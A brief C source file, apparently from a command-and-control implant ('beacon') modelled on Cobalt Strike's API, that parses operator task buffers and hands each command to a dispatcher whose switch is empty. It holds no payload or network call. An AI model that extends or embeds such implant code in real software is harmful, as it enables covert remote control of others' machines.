#include "pch.h"

#include "beacon.h"
#include "command.h"
#include "spawn.h"

void TaskDispatch(int cmd, char* buffer, int size)
{
	switch (cmd)
	{
		
	}
}

void TaskProcess(char* buffer, int length)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);

	int remaining;
	do
	{
		int cmd = BeaconDataInt(&parser);
		int size = BeaconDataInt(&parser);
		char* data = BeaconDataPtr(&parser, size);

		remaining = BeaconDataLength(&parser);
		if (remaining < 0) // this should never happen
			return;

		TaskDispatch(cmd, data, size);
	} while (remaining > 0);

	BeaconDataZero(&parser);
}

